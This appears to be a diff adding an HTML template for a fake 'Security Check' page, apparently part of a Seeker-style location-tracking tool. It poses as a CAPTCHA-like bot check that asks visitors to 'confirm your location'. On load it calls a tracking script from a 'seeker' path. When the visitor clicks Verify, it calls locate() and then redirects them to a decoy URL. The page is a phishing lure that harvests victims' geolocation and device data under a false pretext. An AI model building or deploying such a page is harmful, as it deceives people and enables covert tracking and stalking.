@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Check</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #f9f9f9;
+      color: #202124;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .card {
+      max-width: 400px;
+      background: #fff;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      padding: 32px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+    }
+    .captcha-box {
+      border: 2px solid #dadce0;
+      border-radius: 4px;
+      padding: 16px;
+      margin-bottom: 24px;
+      background: #f8f9fa;
+      text-align: center;
+    }
+    .captcha-box p { font-size: 0.9rem; color: #5f6368; margin-bottom: 12px; }
+    h1 { font-size: 1.25rem; margin-bottom: 16px; }
+    p { color: #5f6368; font-size: 0.95rem; line-height: 1.5; margin-bottom: 24px; }
+    .btn {
+      display: inline-block;
+      padding: 10px 28px;
+      background: #1a73e8;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 1rem;
+      font-weight: 500;
+      cursor: pointer;
+    }
+    .btn:hover { background: #1765cc; }
+    #status { margin-top: 16px; font-size: 0.9rem; color: #5f6368; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Before you continue</h1>
+    <p>We need to verify you're not a bot. Please confirm your location to proceed.</p>
+    <div class="captcha-box">
+      <p>Verify you're human</p>
+      <p style="font-size: 0.85rem;">Location verification helps protect this site from automated access.</p>
+    </div>
+    <button id="verifyBtn" class="btn" onclick="handleVerify()">Verify</button>
+    <div id="status"></div>
+  </div>
+  <script>
+    window.SEEKER_API_BASE = {{ api_base }};
+  </script>
+  <script src="/static/seeker/js/location.js"></script>
+  <script>
+    information();
+    function handleVerify() {
+      var btn = document.getElementById('verifyBtn');
+      var status = document.getElementById('status');
+      btn.disabled = true;
+      btn.textContent = 'Verifying...';
+      var redirectUrl = {{ redirect_url }} || 'https://www.google.com';
+      locate(
+        function() {
+          status.textContent = 'Verification complete.';
+          window.location.href = redirectUrl;
+        },
+        function(err, msg) {
+          status.textContent = 'Verification failed. ' + (msg || 'Please enable location.');
+          btn.disabled = false;
+          btn.textContent = 'Verify';
+        }
+      );
+    }
+  </script>
+</body>
+</html>
